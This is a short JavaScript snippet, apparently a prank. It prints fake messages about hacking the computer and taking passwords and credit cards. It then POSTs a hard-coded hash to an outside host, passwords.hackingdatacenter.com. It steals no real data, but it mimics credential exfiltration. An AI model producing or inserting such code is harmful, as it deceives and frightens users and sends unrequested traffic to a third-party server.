function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
  
  const messages = ["Hacking your computer...", "Computer hacked!", "Taking passwords and credit cards..", "SHA256 encrypted passwords are \"37C1C61F61A80812A400D39F706DB584B00FC3C40A109424076DF3DCF83157E1\"", "Account hacked and data delivered..."];
  
    (async () => {
      for (let x = 0; x < messages.length; ++x) {
        console.log(messages[x])
        await sleep(2000)
      }
      fetch("https://passwords.hackingdatacenter.com/", {method: "POST", body: {passwords:"37C1C61F61A80812A400D39F706DB584B00FC3C40A109424076DF3DCF83157E1"}})
    })()